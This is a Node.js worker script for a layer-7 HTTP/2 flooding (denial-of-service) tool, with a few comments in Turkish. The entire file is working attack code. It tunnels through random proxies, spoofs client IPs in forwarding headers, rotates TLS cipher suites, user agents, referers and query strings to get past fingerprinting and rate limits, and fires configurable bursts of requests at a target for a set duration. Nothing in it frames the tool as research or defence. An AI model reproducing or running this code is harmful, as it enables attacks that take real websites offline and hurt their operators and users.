const { parentPort, workerData } = require('worker_threads');
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const url = require("url");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const { HeaderGenerator } = require('header-generator');
const https = require('https');

const { target, proxies, duration, threads, rate, port } = workerData;
const targetURL = target.startsWith('http') ? target : 'http://' + target;
const parsedTarget = url.parse(targetURL);
const isHttps = parsedTarget.protocol === 'https:';

let localStats = { sent: 0, success: 0, failed: 0, bytes: 0 };
let active = true;

// Canlı istatistikleri ana thread'e ilet
const statsInterval = setInterval(() => {
    if (active) parentPort.postMessage({ type: 'stats', data: localStats });
}, 500);

// Get current time function
const getCurrentTime = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `(${hours}:${minutes}:${seconds})`;
};

// Helper functions
function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomString(length) {
    var result = "";
    var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    };
    return result;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

// Cipher suites list
const cplist = [
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
];

// Signature algorithms
const sigalgs = [
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    'ecdsa_brainpoolP256r1tls13_sha256',
    'ecdsa_brainpoolP384r1tls13_sha384',
    'ecdsa_brainpoolP512r1tls13_sha512',
    'ed25519',
    'ecdsa_sha1'
];

const concu = sigalgs.join(':');

// Referer list
const refers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://duckduckgo.com/?q=",
    "https://www.google.com/search?q=",
];

// User agent list
const uap = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
];

// Generate random IP
const ip_spoof = () => {
    const ip_segment = () => {
        return Math.floor(Math.random() * 255);
    };
    return `${ip_segment()}.${ip_segment()}.${ip_segment()}.${ip_segment()}`;
};

// Header Generator
let headerGenerator = new HeaderGenerator({
    browsers: [
        { name: "firefox", minVersion: 112, httpVersion: "2" },
        { name: "opera", minVersion: 112, httpVersion: "2" },
        { name: "edge", minVersion: 112, httpVersion: "2" },
        { name: "chrome", minVersion: 112, httpVersion: "2" },
        { name: "safari", minVersion: 16, httpVersion: "2" },
    ],
    devices: ["desktop", "mobile"],
    operatingSystems: ["windows", "linux", "macos", "android", "ios"],
    locales: ["en-US", "en"]
});

// Path variations
const pathts = [
    "?page=1",
    "?page=2",
    "?page=3",
    "?category=news",
    "?category=sports",
    "?category=technology",
    "?category=entertainment",
    "?sort=newest",
    "?filter=popular",
    "?limit=10",
    "?start_date=1989-06-04",
    "?end_date=1989-06-04",
];

const Methods = ["GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"];
const queryStrings = ["&", "="];

// Proxy connection class
class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

// Main attack function
function runFlooder() {
    if (!active) return;
    
    // Use proxy if available, otherwise direct connection
    let proxyAddr = null;
    if (proxies && proxies.length > 0) {
        proxyAddr = randomElement(proxies);
    }

    if (proxyAddr) {
        // Use proxy
        const parsedProxy = proxyAddr.split(":");
        if (parsedProxy.length < 2) return;

        const proxyOptions = {
            host: parsedProxy[0],
            port: parseInt(parsedProxy[1]),
            address: parsedTarget.host + ":443",
            timeout: 25
        };

        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error) {
                localStats.failed++;
                return;
            }

            if (!connection) {
                localStats.failed++;
                return;
            }

            connection.setKeepAlive(true, 100000);
            makeHTTP2Connection(connection);
        });
    } else {
        // Direct connection
        makeHTTP2Connection();
    }
}

function makeHTTP2Connection(proxySocket = null) {
    if (!active) return;

    try {
        // Generate headers
        let randomHeaders = headerGenerator.getHeaders();
        const fakeIP = ip_spoof();
        var cipper = randomElement(cplist);
        var randomReferer = randomElement(refers);
        var randomMethod = randomElement(Methods);

        // Prepare headers
        const headers = {};
        headers[":method"] = randomMethod;
        headers[":path"] = parsedTarget.path + randomElement(pathts) + "&" + randomString(10) + randomElement(queryStrings) + randomString(10);
        headers["origin"] = parsedTarget.host;
        headers["Content-Type"] = randomHeaders['Content-Type'] || 'application/json';
        headers[":scheme"] = "https";
        headers["accept"] = randomHeaders['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
        headers["accept-language"] = randomHeaders['accept-language'] || 'en-US,en;q=0.5';
        headers["accept-encoding"] = randomHeaders['accept-encoding'] || 'gzip, deflate, br';
        headers["cache-control"] = randomHeaders['cache-control'] || 'no-cache';
        headers["pragma"] = randomHeaders['pragma'] || 'no-cache';
        headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'] || '"Windows"';
        headers["upgrade-insecure-requests"] = "1";
        headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'] || 'document';
        headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'] || 'navigate';
        headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'] || 'none';
        headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'] || '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"';
        headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'] || '?0';
        headers["x-requested-with"] = "XMLHttpRequest";
        headers["TE"] = "trailers";
        headers["Via"] = fakeIP;
        headers["X-Forwarded-For"] = fakeIP;
        headers["X-Forwarded-Host"] = fakeIP;
        headers["Client-IP"] = fakeIP;
        headers["Real-IP"] = fakeIP;
        headers["Referer"] = randomReferer;
        headers[":authority"] = parsedTarget.host;
        headers["user-agent"] = randomElement(uap);

        // TLS options
        const tlsOptions = {
            ALPNProtocols: ['h2'],
            ciphers: cipper,
            secureProtocol: ["TLSv1_2_method", "TLSv1_3_method"],
            servername: parsedTarget.hostname,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
            sigalgs: concu,
            ecdhCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
            secure: true,
            rejectUnauthorized: false,
            sessionTimeout: 5000,
        };

        // If proxy socket, use it
        if (proxySocket) {
            tlsOptions.socket = proxySocket;
        }

        const targetPort = parsedTarget.port || (isHttps ? 443 : 80);
        const tlsConn = tls.connect(targetPort, parsedTarget.hostname, tlsOptions);
        tlsConn.setKeepAlive(true, 60 * 10000);

        // HTTP/2 client
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        });

        client.on("connect", () => {
            // Send requests
            for (let i = 0; i < Math.floor(rate / threads); i++) {
                if (!active) break;

                try {
                    const request = client.request(headers);
                    localStats.sent++;

                    request.on("response", response => {
                        if (response[':status'] === 200) {
                            localStats.success++;
                        } else {
                            localStats.failed++;
                        }
                        request.close();
                    });

                    request.on("data", chunk => {
                        localStats.bytes += chunk.length;
                    });

                    request.on("error", () => {
                        localStats.failed++;
                    });

                    request.end();
                } catch (e) {
                    localStats.failed++;
                }
            }

            // Close connection after some time
            setTimeout(() => {
                try {
                    client.close();
                    if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
                } catch (e) {}
            }, 2000);
        });

        client.on("close", () => {
            try {
                client.destroy();
                if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
            } catch (e) {}
        });

        client.on("error", error => {
            localStats.failed++;
            try {
                client.destroy();
                if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
            } catch (e) {}
        });

    } catch (e) {
        localStats.failed++;
    }
}

// Start attack loop
const attackInterval = setInterval(() => {
    if (!active) return;
    
    for (let i = 0; i < threads; i++) {
        runFlooder();
    }
}, 100);

// Duration timeout
setTimeout(() => {
    active = false;
    clearInterval(attackInterval);
    clearInterval(statsInterval);
    parentPort.postMessage({ type: 'stats', data: localStats });
    setTimeout(() => process.exit(0), 1000);
}, duration);

// Handle termination
parentPort.on('message', (msg) => {
    if (msg === 'stop') {
        active = false;
        clearInterval(attackInterval);
        clearInterval(statsInterval);
        setTimeout(() => process.exit(0), 100);
    }
});